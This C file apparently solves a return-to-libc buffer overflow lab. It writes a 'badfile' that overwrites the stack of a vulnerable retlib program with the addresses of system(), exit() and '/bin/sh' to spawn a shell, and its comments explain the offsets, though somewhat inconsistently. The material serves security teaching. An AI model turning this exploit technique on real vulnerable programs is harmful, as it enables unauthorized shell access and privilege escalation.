#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    /*********************************************************************
     *  This program writes out 'badfile' which is the string we use to
     *  overflow a buffer in the retlib.c program. Here are some valuable
     *  notes for future reference. Also, running the retlib program with
     *  a zero length 'badfile' will print out some of the addresses and
     *  offsets you need for this program.
     *
     *  1.  offset: This is the distance between the start of the buffer
     *      in the bof() function and the frame pointer (ebp). We must add
     *      four bytes to the value of offset due to the fact that the
     *      function epilogue in bof() will pop off the old ebp value,
     *      which we have modified with our input string, and that process
     *      makes the esp pointer 4 bytes higher. When the system()
     *      function is entered, as a result of the pop, the function
     *      prologue will assign the current value of esp to ebp which
     *      is four bytes more that it was in the bof() function.
     *  2.  X: This is the value of offset plus the eight bytes necessary
     *      to address the first argument for the system() function. This
     *      is where we place the "/bin/sh" value.
     *  3.  Y: This is the value offset. It is where we store the address
     *      of the exit() function and the value of ebp points right to
     *      the beginning of this field. This is where ebp stays for the
     *      function.
     *  4.  Z: This is the offset plus the 4 bytes necessary to address
     *      the return address field. In our string, this is where we
     *      place the address of the exit() function.
     *  5.  shell_addr: This is the address of the string "/bin/sh". We
     *      have put that value in an environment variable that retlib
     *      gets that from the shell from which it was executed.
     *  6.  system_addr: This is the address of the system() function
     *      and must be discovered by running a gdb session on retlib.
     *  7.  exit_addr: This is the address of the exit() functin and must
     *      be discovered by running a gdb session on retlib.
     *********************************************************************/
    char buf[300];
    FILE *badfile;
    int offset = 80 + 4;
    int X = offset + 8;
    int Y = offset;
    int Z = offset + 4;
    int shell_addr = 0xbffffdef;    // address of "/bin/sh"
    int system_addr = 0xb7e42da0;   // address of system()
    int exit_addr = 0xb7e369d0;     // address of exit()

    badfile = fopen("./badfile", "w");

    /* Initialize buf with 0xaa (just a non-zero value) */
    memset(&buf, 0xaa, 300);   // Kool!

    /* Author did it this way which looks pretty cool!
    *(long *) &buf[X] = shell_addr ;   //  "/bin/sh"
    *(long *) &buf[Y] = system_addr ;   //  system()
    *(long *) &buf[Z] = exit_addr ;   //  exit()
    */
    memcpy(&buf[offset + 0], &system_addr, 4);  // old ebp field
    memcpy(&buf[offset + 4], &exit_addr, 4);    // return address field
    memcpy(&buf[offset + 8], &shell_addr, 4);   // first argument field

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
